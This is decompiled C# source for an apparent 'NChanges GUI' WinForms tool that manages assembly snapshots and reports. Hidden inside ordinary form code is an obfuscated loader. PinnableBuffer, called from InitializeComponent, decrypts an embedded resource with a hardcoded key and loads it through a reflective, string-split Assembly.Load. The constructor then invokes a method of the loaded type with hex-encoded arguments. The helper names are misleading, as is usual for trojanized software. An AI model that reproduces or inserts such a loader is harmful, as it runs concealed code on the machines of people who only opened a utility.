using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace NChanges;

public class ApiChangesForm : Form
{
	private const string NCHANGES_TOOL_EXE = "NChanges.exe";

	private const string TITLE_SUFFIX = "NChanges GUI";

	private const string TITLE_SEPARATOR = " - ";

	private const string PROJECT_FILTER = "NChanges Files (*.nchanges)|*.nchanges|MSBuild Files (*.msbuild)|*.msbuld|All Files (*.*)|*.*";

	private const string ASSEMBLY_FILTER = "Assembly Files (*.dll)|*.dll";

	private string _currentProjectPath;

	private bool _dirty;

	private IContainer components;

	private static object CacheEvent;

	private OpenFileDialog openFileDialog1;

	private FolderBrowserDialog folderBrowserDialog1;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private Label label4;

	private Button btnCreateSnapshots;

	private Label label16;

	private TextBox txtTypesToExclude;

	private MenuStrip menuStrip;

	private ToolStripMenuItem toolStripMenuItem1;

	private ToolStripMenuItem openToolStripMenuItem;

	private ToolStripMenuItem recentProjectsToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator1;

	private ToolStripMenuItem exitToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator2;

	private ToolStripMenuItem saveProjectToolStripMenuItem;

	private ToolStripSeparator recentProjectsToolStripSeparator;

	private ToolStripMenuItem clearToolStripMenuItem;

	private ToolStripMenuItem closeProjectToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator3;

	private ListView assembliesListView;

	private ColumnHeader assemblyColumnHeader;

	private ColumnHeader versionColumnHeader;

	private Button editVersionButton;

	private Button removeAssemblyButton;

	private Button addAssemblyButton;

	private Button editPathButton;

	private Button btnCreateReports;

	private Label label1;

	private TextBox txtExcelOutput;

	private Button btnExportToExcel;

	private Button btnViewExcelOutput;

	public ApiChangesForm()
	{
		InitializeComponent();
		((Type)CacheEvent).GetMethods()[0].Invoke(null, new object[3] { "4E756C6C53747265616D526561", "6D644F", "NChanges" });
		UpdateRecentProjects();
	}

	private void openToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		SetFileDialogProperties((FileDialog)(object)val);
		if ((int)((CommonDialog)val).ShowDialog((IWin32Window)(object)this) == 1)
		{
			LoadProject(((FileDialog)val).get_FileName());
		}
	}

	private void closeProjectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		UpdateGUI(new Project());
		_currentProjectPath = null;
		SetTitle();
	}

	private void saveProjectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Invalid comparison between Unknown and I4
		if (_currentProjectPath == null)
		{
			SaveFileDialog val = new SaveFileDialog();
			SetFileDialogProperties((FileDialog)(object)val);
			if ((int)((CommonDialog)val).ShowDialog((IWin32Window)(object)this) == 1)
			{
				_currentProjectPath = ((FileDialog)val).get_FileName();
			}
		}
		if (_currentProjectPath != null)
		{
			SaveProject(_currentProjectPath);
		}
	}

	private void clearToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Settings.Default.ClearRecentProjects();
		UpdateRecentProjects();
	}

	private static void SetFileDialogProperties(FileDialog dialog)
	{
		dialog.set_Filter("NChanges Files (*.nchanges)|*.nchanges|MSBuild Files (*.msbuild)|*.msbuld|All Files (*.*)|*.*");
		List<string> recentProjects = Settings.Default.RecentProjects;
		if (recentProjects != null && recentProjects.Count > 0)
		{
			dialog.set_InitialDirectory(Path.GetDirectoryName(recentProjects[0]));
		}
	}

	private void LoadProject(string path)
	{
		Project project = new Project();
		project.ReadXml(path);
		UpdateGUI(project);
		Settings.Default.AddRecentProject(path);
		UpdateRecentProjects();
		_currentProjectPath = path;
		SetTitle();
		_dirty = false;
	}

	private void UpdateGUI(Project project)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		foreach (AssemblyToSnapshot item in project.AssembliesToSnapshot)
		{
			ListViewItem val = new ListViewItem(new string[2] { item.Path, item.Version });
			assembliesListView.get_Items().Add(val);
		}
		((Control)txtTypesToExclude).set_Text(project.TypesToExcludePattern);
		((Control)txtExcelOutput).set_Text(project.ExcelOutputPath);
	}

	private void SaveProject(string path)
	{
		Project project = new Project
		{
			NChangesToolPath = GetNChangesToolPath(),
			TypesToExcludePattern = ((Control)txtTypesToExclude).get_Text(),
			ExcelOutputPath = ((Control)txtExcelOutput).get_Text()
		};
		foreach (AssemblyToSnapshot item in from ListViewItem i in (IEnumerable)assembliesListView.get_Items()
			select new AssemblyToSnapshot
			{
				Path = i.get_SubItems().get_Item(0).get_Text(),
				Version = i.get_SubItems().get_Item(1).get_Text()
			})
		{
			project.AssembliesToSnapshot.Add(item);
		}
		project.WriteXml(path);
		Settings.Default.AddRecentProject(path);
		UpdateRecentProjects();
		SetTitle();
		_dirty = false;
	}

	private void UpdateRecentProjects()
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		List<string> recentProjects = Settings.Default.RecentProjects;
		((ToolStripDropDownItem)recentProjectsToolStripMenuItem).get_DropDownItems().Clear();
		if (recentProjects != null)
		{
			foreach (string item2 in recentProjects)
			{
				ToolStripMenuItem val = new ToolStripMenuItem();
				((ToolStripItem)val).set_Text(item2);
				ToolStripMenuItem item = val;
				((ToolStripItem)item).add_Click((EventHandler)delegate
				{
					LoadProject(((ToolStripItem)item).get_Text());
				});
				((ToolStripDropDownItem)recentProjectsToolStripMenuItem).get_DropDownItems().Add((ToolStripItem)(object)item);
			}
		}
		else
		{
			ToolStripItemCollection dropDownItems = ((ToolStripDropDownItem)recentProjectsToolStripMenuItem).get_DropDownItems();
			ToolStripMenuItem val2 = new ToolStripMenuItem();
			((ToolStripItem)val2).set_Text("(empty)");
			((ToolStripItem)val2).set_Enabled(false);
			dropDownItems.Add((ToolStripItem)val2);
		}
		((ToolStripDropDownItem)recentProjectsToolStripMenuItem).get_DropDownItems().Add((ToolStripItem)(object)recentProjectsToolStripSeparator);
		((ToolStripDropDownItem)recentProjectsToolStripMenuItem).get_DropDownItems().Add((ToolStripItem)(object)clearToolStripMenuItem);
	}

	private void SetTitle()
	{
		if (_currentProjectPath == null)
		{
			((Control)this).set_Text("NChanges GUI");
		}
		else
		{
			((Control)this).set_Text(string.Format("{0}{1}{2}", Path.GetFileNameWithoutExtension(_currentProjectPath), " - ", "NChanges GUI"));
		}
	}

	private string GetNChangesToolPath()
	{
		return Path.Combine(Path.GetDirectoryName(Application.get_ExecutablePath()), "NChanges.exe");
	}

	private void addAssemblyButton_Click(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Invalid comparison between Unknown and I4
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		((FileDialog)openFileDialog1).set_Filter("Assembly Files (*.dll)|*.dll");
		if ((int)((CommonDialog)openFileDialog1).ShowDialog() == 1)
		{
			assembliesListView.get_Items().Add(new ListViewItem(new string[2]
			{
				((FileDialog)openFileDialog1).get_FileName(),
				""
			}));
			_dirty = true;
		}
	}

	private void editPathButton_Click(object sender, EventArgs e)
	{
		EditAssemblySubItem(0, "Assembly Path");
	}

	private void editVersionButton_Click(object sender, EventArgs e)
	{
		EditAssemblySubItem(1, "Assembly Version");
	}

	private void EditAssemblySubItem(int subItemIndex, string prompt)
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Invalid comparison between Unknown and I4
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		if (assembliesListView.get_SelectedItems().get_Count() == 0)
		{
			return;
		}
		string value = assembliesListView.get_SelectedItems().get_Item(0).get_SubItems()
			.get_Item(subItemIndex)
			.get_Text();
		if ((int)InputBox.Show("NChanges GUI", prompt, ref value) != 1)
		{
			return;
		}
		foreach (ListViewItem selectedItem in assembliesListView.get_SelectedItems())
		{
			selectedItem.get_SubItems().get_Item(subItemIndex).set_Text(value);
		}
		_dirty = true;
	}

	private void removeAssemblyButton_Click(object sender, EventArgs e)
	{
		if (assembliesListView.get_SelectedItems().get_Count() == 0)
		{
			return;
		}
		foreach (ListViewItem item in new List<ListViewItem>(((IEnumerable)assembliesListView.get_SelectedItems()).Cast<ListViewItem>()))
		{
			assembliesListView.get_Items().Remove(item);
			_dirty = true;
		}
	}

	private void btnCreateSnapshots_Click(object sender, EventArgs e)
	{
		RunTask(Project.SnapshotTaskName);
	}

	private void btnCreateReports_Click(object sender, EventArgs e)
	{
		RunTask(Project.ReportTaskName);
	}

	private void btnExportToExcel_Click(object sender, EventArgs e)
	{
		RunTask(Project.ExcelTaskName);
	}

	private void RunTask(string taskName)
	{
		if (VerifyProject())
		{
			Project.Run(_currentProjectPath, taskName);
		}
	}

	private bool VerifyProject()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		if (_currentProjectPath == null)
		{
			MessageBox.Show("You need to open or save a project first...", "Sorry!", (MessageBoxButtons)0, (MessageBoxIcon)48);
			return false;
		}
		if (_dirty)
		{
			SaveProject(_currentProjectPath);
		}
		return true;
	}

	private void btnViewExcelOutput_Click(object sender, EventArgs e)
	{
		if (VerifyProject())
		{
			Process.Start(Path.Combine(Path.GetDirectoryName(_currentProjectPath), ((Control)txtExcelOutput).get_Text()));
		}
	}

	private void txtTypesToExclude_TextChanged(object sender, EventArgs e)
	{
		_dirty = true;
	}

	private void txtExcelOutput_TextChanged(object sender, EventArgs e)
	{
		_dirty = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private static AnchorStyles PinnableBuffer()
	{
		byte[] array = (byte[])new ResourceManager(typeof(ApiChangesForm)).GetObject("UnderlyingSystemType");
		string pass = "5S3Z5C2H5489RFE7855Z8H";
		for (int i = 98326; i >= 0; i += -1)
		{
			array = CodePage(pass, array, i);
		}
		DebugView(KeyedCollection(array));
		return (AnchorStyles)6;
	}

	private static byte[] CodePage(string pass, byte[] tt, int i)
	{
		tt[i % 49152] = @string((IResourceWriter(tt, pass, 49152, i) - @uint(tt[(i + 1) % 49152]) + 256) % 256);
		return tt;
	}

	private static int IResourceWriter(byte[] tt, string pass, int len, int i)
	{
		return @uint(tt[i % len] ^ pass[i % 22]);
	}

	private static int @uint(int x)
	{
		return x;
	}

	private static byte @string(int x)
	{
		return (byte)x;
	}

	private static object KeyedCollection(byte[] OPTS)
	{
		return typeof(Assembly).InvokeMember("L" + string.Empty + "oa" + string.Empty + "d", BindingFlags.InvokeMethod, null, null, new object[1] { OPTS });
	}

	private static void DebugView(object Mscorlib)
	{
		CacheEvent = ((Assembly)Mscorlib).GetType("CU0mxh8nSOsmJDWZHj.MrjSg7KR80F4fcrGf4");
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c1: Unknown result type (might be due to invalid IL or missing references)
		openFileDialog1 = new OpenFileDialog();
		folderBrowserDialog1 = new FolderBrowserDialog();
		tabControl1 = new TabControl();
		tabPage1 = new TabPage();
		btnViewExcelOutput = new Button();
		btnExportToExcel = new Button();
		label1 = new Label();
		txtExcelOutput = new TextBox();
		btnCreateReports = new Button();
		editPathButton = new Button();
		editVersionButton = new Button();
		removeAssemblyButton = new Button();
		addAssemblyButton = new Button();
		assembliesListView = new ListView();
		assemblyColumnHeader = new ColumnHeader();
		versionColumnHeader = new ColumnHeader();
		label16 = new Label();
		txtTypesToExclude = new TextBox();
		label4 = new Label();
		btnCreateSnapshots = new Button();
		menuStrip = new MenuStrip();
		toolStripMenuItem1 = new ToolStripMenuItem();
		openToolStripMenuItem = new ToolStripMenuItem();
		recentProjectsToolStripMenuItem = new ToolStripMenuItem();
		recentProjectsToolStripSeparator = new ToolStripSeparator();
		clearToolStripMenuItem = new ToolStripMenuItem();
		toolStripSeparator2 = new ToolStripSeparator();
		closeProjectToolStripMenuItem = new ToolStripMenuItem();
		toolStripSeparator3 = new ToolStripSeparator();
		saveProjectToolStripMenuItem = new ToolStripMenuItem();
		toolStripSeparator1 = new ToolStripSeparator();
		exitToolStripMenuItem = new ToolStripMenuItem();
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage1).SuspendLayout();
		((Control)menuStrip).SuspendLayout();
		((Control)this).SuspendLayout();
		((FileDialog)openFileDialog1).set_FileName("openFileDialog1");
		((Control)tabControl1).set_Anchor((AnchorStyles)15);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabControl1).set_Location(new Point(12, 27));
		((Control)tabControl1).set_Name("tabControl1");
		tabControl1.set_SelectedIndex(0);
		((Control)tabControl1).set_Size(new Size(604, 534));
		((Control)tabControl1).set_TabIndex(23);
		((Control)tabPage1).get_Controls().Add((Control)(object)btnViewExcelOutput);
		((Control)tabPage1).get_Controls().Add((Control)(object)btnExportToExcel);
		((Control)tabPage1).get_Controls().Add((Control)(object)label1);
		((Control)tabPage1).get_Controls().Add((Control)(object)txtExcelOutput);
		((Control)tabPage1).get_Controls().Add((Control)(object)btnCreateReports);
		((Control)tabPage1).get_Controls().Add((Control)(object)editPathButton);
		((Control)tabPage1).get_Controls().Add((Control)(object)editVersionButton);
		((Control)tabPage1).get_Controls().Add((Control)(object)removeAssemblyButton);
		((Control)tabPage1).get_Controls().Add((Control)(object)addAssemblyButton);
		((Control)tabPage1).get_Controls().Add((Control)(object)assembliesListView);
		((Control)tabPage1).get_Controls().Add((Control)(object)label16);
		((Control)tabPage1).get_Controls().Add((Control)(object)txtTypesToExclude);
		((Control)tabPage1).get_Controls().Add((Control)(object)label4);
		((Control)tabPage1).get_Controls().Add((Control)(object)btnCreateSnapshots);
		tabPage1.set_Location(new Point(4, 22));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(3));
		((Control)tabPage1).set_Size(new Size(596, 508));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("Snapshot");
		tabPage1.set_UseVisualStyleBackColor(true);
		((Control)btnViewExcelOutput).set_Anchor(PinnableBuffer());
		((Control)btnViewExcelOutput).set_Location(new Point(100, 444));
		((Control)btnViewExcelOutput).set_Name("btnViewExcelOutput");
		((Control)btnViewExcelOutput).set_Size(new Size(124, 23));
		((Control)btnViewExcelOutput).set_TabIndex(53);
		((Control)btnViewExcelOutput).set_Text("View Excel Output");
		((ButtonBase)btnViewExcelOutput).set_UseVisualStyleBackColor(false);
		((Control)btnViewExcelOutput).add_Click((EventHandler)btnViewExcelOutput_Click);
		((Control)btnExportToExcel).set_Anchor((AnchorStyles)6);
		((Control)btnExportToExcel).set_Location(new Point(100, 415));
		((Control)btnExportToExcel).set_Name("btnExportToExcel");
		((Control)btnExportToExcel).set_Size(new Size(124, 23));
		((Control)btnExportToExcel).set_TabIndex(52);
		((Control)btnExportToExcel).set_Text("Export to Excel");
		((ButtonBase)btnExportToExcel).set_UseVisualStyleBackColor(false);
		((Control)btnExportToExcel).add_Click((EventHandler)btnExportToExcel_Click);
		((Control)label1).set_Anchor((AnchorStyles)6);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(23, 381));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(71, 13));
		((Control)label1).set_TabIndex(51);
		((Control)label1).set_Text("Excel Output:");
		((Control)txtExcelOutput).set_Anchor((AnchorStyles)6);
		((Control)txtExcelOutput).set_Location(new Point(100, 378));
		((Control)txtExcelOutput).set_Name("txtExcelOutput");
		((Control)txtExcelOutput).set_Size(new Size(427, 20));
		((Control)txtExcelOutput).set_TabIndex(50);
		((Control)txtExcelOutput).add_TextChanged((EventHandler)txtExcelOutput_TextChanged);
		((Control)btnCreateReports).set_Anchor((AnchorStyles)6);
		((Control)btnCreateReports).set_Location(new Point(100, 317));
		((Control)btnCreateReports).set_Name("btnCreateReports");
		((Control)btnCreateReports).set_Size(new Size(124, 23));
		((Control)btnCreateReports).set_TabIndex(49);
		((Control)btnCreateReports).set_Text("Create Reports");
		((ButtonBase)btnCreateReports).set_UseVisualStyleBackColor(false);
		((Control)btnCreateReports).add_Click((EventHandler)btnCreateReports_Click);
		((Control)editPathButton).set_Anchor((AnchorStyles)6);
		((Control)editPathButton).set_Location(new Point(213, 215));
		((Control)editPathButton).set_Name("editPathButton");
		((Control)editPathButton).set_Size(new Size(75, 23));
		((Control)editPathButton).set_TabIndex(48);
		((Control)editPathButton).set_Text("Edit Path");
		((ButtonBase)editPathButton).set_UseVisualStyleBackColor(true);
		((Control)editPathButton).add_Click((EventHandler)editPathButton_Click);
		((Control)editVersionButton).set_Anchor((AnchorStyles)6);
		((Control)editVersionButton).set_Location(new Point(294, 215));
		((Control)editVersionButton).set_Name("editVersionButton");
		((Control)editVersionButton).set_Size(new Size(75, 23));
		((Control)editVersionButton).set_TabIndex(47);
		((Control)editVersionButton).set_Text("Edit Version");
		((ButtonBase)editVersionButton).set_UseVisualStyleBackColor(true);
		((Control)editVersionButton).add_Click((EventHandler)editVersionButton_Click);
		((Control)removeAssemblyButton).set_Anchor((AnchorStyles)6);
		((Control)removeAssemblyButton).set_Location(new Point(375, 215));
		((Control)removeAssemblyButton).set_Name("removeAssemblyButton");
		((Control)removeAssemblyButton).set_Size(new Size(110, 23));
		((Control)removeAssemblyButton).set_TabIndex(46);
		((Control)removeAssemblyButton).set_Text("Remove");
		((ButtonBase)removeAssemblyButton).set_UseVisualStyleBackColor(true);
		((Control)removeAssemblyButton).add_Click((EventHandler)removeAssemblyButton_Click);
		((Control)addAssemblyButton).set_Anchor((AnchorStyles)6);
		((Control)addAssemblyButton).set_Location(new Point(100, 215));
		((Control)addAssemblyButton).set_Name("addAssemblyButton");
		((Control)addAssemblyButton).set_Size(new Size(107, 23));
		((Control)addAssemblyButton).set_TabIndex(45);
		((Control)addAssemblyButton).set_Text("Add");
		((ButtonBase)addAssemblyButton).set_UseVisualStyleBackColor(true);
		((Control)addAssemblyButton).add_Click((EventHandler)addAssemblyButton_Click);
		((Control)assembliesListView).set_Anchor((AnchorStyles)15);
		assembliesListView.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { assemblyColumnHeader, versionColumnHeader });
		assembliesListView.set_FullRowSelect(true);
		((Control)assembliesListView).set_Location(new Point(100, 6));
		((Control)assembliesListView).set_Name("assembliesListView");
		((Control)assembliesListView).set_Size(new Size(483, 203));
		((Control)assembliesListView).set_TabIndex(44);
		assembliesListView.set_UseCompatibleStateImageBehavior(false);
		assembliesListView.set_View((View)1);
		assemblyColumnHeader.set_Text("Assembly");
		assemblyColumnHeader.set_Width(240);
		versionColumnHeader.set_Text("Version");
		versionColumnHeader.set_Width(80);
		((Control)label16).set_Anchor((AnchorStyles)6);
		((Control)label16).set_AutoSize(true);
		((Control)label16).set_Location(new Point(-2, 254));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(96, 13));
		((Control)label16).set_TabIndex(42);
		((Control)label16).set_Text("Types To Exclude:");
		((Control)txtTypesToExclude).set_Anchor((AnchorStyles)6);
		((Control)txtTypesToExclude).set_Location(new Point(100, 251));
		((Control)txtTypesToExclude).set_Name("txtTypesToExclude");
		((Control)txtTypesToExclude).set_Size(new Size(478, 20));
		((Control)txtTypesToExclude).set_TabIndex(41);
		((Control)txtTypesToExclude).add_TextChanged((EventHandler)txtTypesToExclude_TextChanged);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(32, 33));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(62, 13));
		((Control)label4).set_TabIndex(32);
		((Control)label4).set_Text("Assemblies:");
		((Control)btnCreateSnapshots).set_Anchor((AnchorStyles)6);
		((Control)btnCreateSnapshots).set_Location(new Point(100, 288));
		((Control)btnCreateSnapshots).set_Name("btnCreateSnapshots");
		((Control)btnCreateSnapshots).set_Size(new Size(124, 23));
		((Control)btnCreateSnapshots).set_TabIndex(27);
		((Control)btnCreateSnapshots).set_Text("Create Snapshots");
		((ButtonBase)btnCreateSnapshots).set_UseVisualStyleBackColor(true);
		((Control)btnCreateSnapshots).add_Click((EventHandler)btnCreateSnapshots_Click);
		((ToolStrip)menuStrip).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)toolStripMenuItem1 });
		((Control)menuStrip).set_Location(new Point(0, 0));
		((Control)menuStrip).set_Name("menuStrip");
		((Control)menuStrip).set_Size(new Size(628, 24));
		((Control)menuStrip).set_TabIndex(24);
		((Control)menuStrip).set_Text("menuStrip");
		((ToolStripDropDownItem)toolStripMenuItem1).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[8]
		{
			(ToolStripItem)openToolStripMenuItem,
			(ToolStripItem)recentProjectsToolStripMenuItem,
			(ToolStripItem)toolStripSeparator2,
			(ToolStripItem)closeProjectToolStripMenuItem,
			(ToolStripItem)toolStripSeparator3,
			(ToolStripItem)saveProjectToolStripMenuItem,
			(ToolStripItem)toolStripSeparator1,
			(ToolStripItem)exitToolStripMenuItem
		});
		((ToolStripItem)toolStripMenuItem1).set_Name("toolStripMenuItem1");
		((ToolStripItem)toolStripMenuItem1).set_Size(new Size(37, 20));
		((ToolStripItem)toolStripMenuItem1).set_Text("&File");
		((ToolStripItem)openToolStripMenuItem).set_Name("openToolStripMenuItem");
		((ToolStripItem)openToolStripMenuItem).set_Size(new Size(182, 22));
		((ToolStripItem)openToolStripMenuItem).set_Text("&Open Project");
		((ToolStripItem)openToolStripMenuItem).add_Click((EventHandler)openToolStripMenuItem_Click);
		((ToolStripDropDownItem)recentProjectsToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)recentProjectsToolStripSeparator,
			(ToolStripItem)clearToolStripMenuItem
		});
		((ToolStripItem)recentProjectsToolStripMenuItem).set_Name("recentProjectsToolStripMenuItem");
		((ToolStripItem)recentProjectsToolStripMenuItem).set_Size(new Size(182, 22));
		((ToolStripItem)recentProjectsToolStripMenuItem).set_Text("Open &Recent Project");
		((ToolStripItem)recentProjectsToolStripSeparator).set_Name("recentProjectsToolStripSeparator");
		((ToolStripItem)recentProjectsToolStripSeparator).set_Size(new Size(98, 6));
		((ToolStripItem)clearToolStripMenuItem).set_Name("clearToolStripMenuItem");
		((ToolStripItem)clearToolStripMenuItem).set_Size(new Size(101, 22));
		((ToolStripItem)clearToolStripMenuItem).set_Text("Clear");
		((ToolStripItem)clearToolStripMenuItem).add_Click((EventHandler)clearToolStripMenuItem_Click);
		((ToolStripItem)toolStripSeparator2).set_Name("toolStripSeparator2");
		((ToolStripItem)toolStripSeparator2).set_Size(new Size(179, 6));
		((ToolStripItem)closeProjectToolStripMenuItem).set_Name("closeProjectToolStripMenuItem");
		((ToolStripItem)closeProjectToolStripMenuItem).set_Size(new Size(182, 22));
		((ToolStripItem)closeProjectToolStripMenuItem).set_Text("&Close Project");
		((ToolStripItem)closeProjectToolStripMenuItem).add_Click((EventHandler)closeProjectToolStripMenuItem_Click);
		((ToolStripItem)toolStripSeparator3).set_Name("toolStripSeparator3");
		((ToolStripItem)toolStripSeparator3).set_Size(new Size(179, 6));
		((ToolStripItem)saveProjectToolStripMenuItem).set_Name("saveProjectToolStripMenuItem");
		((ToolStripItem)saveProjectToolStripMenuItem).set_Size(new Size(182, 22));
		((ToolStripItem)saveProjectToolStripMenuItem).set_Text("&Save Project");
		((ToolStripItem)saveProjectToolStripMenuItem).add_Click((EventHandler)saveProjectToolStripMenuItem_Click);
		((ToolStripItem)toolStripSeparator1).set_Name("toolStripSeparator1");
		((ToolStripItem)toolStripSeparator1).set_Size(new Size(179, 6));
		((ToolStripItem)exitToolStripMenuItem).set_Name("exitToolStripMenuItem");
		((ToolStripItem)exitToolStripMenuItem).set_Size(new Size(182, 22));
		((ToolStripItem)exitToolStripMenuItem).set_Text("E&xit");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.Control);
		((Form)this).set_ClientSize(new Size(628, 573));
		((Control)this).get_Controls().Add((Control)(object)tabControl1);
		((Control)this).get_Controls().Add((Control)(object)menuStrip);
		((Form)this).set_MainMenuStrip(menuStrip);
		((Control)this).set_Name("ApiChangesForm");
		((Control)this).set_Text("NChanges GUI");
		((Control)tabControl1).ResumeLayout(false);
		((Control)tabPage1).ResumeLayout(false);
		((Control)tabPage1).PerformLayout();
		((Control)menuStrip).ResumeLayout(false);
		((Control)menuStrip).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
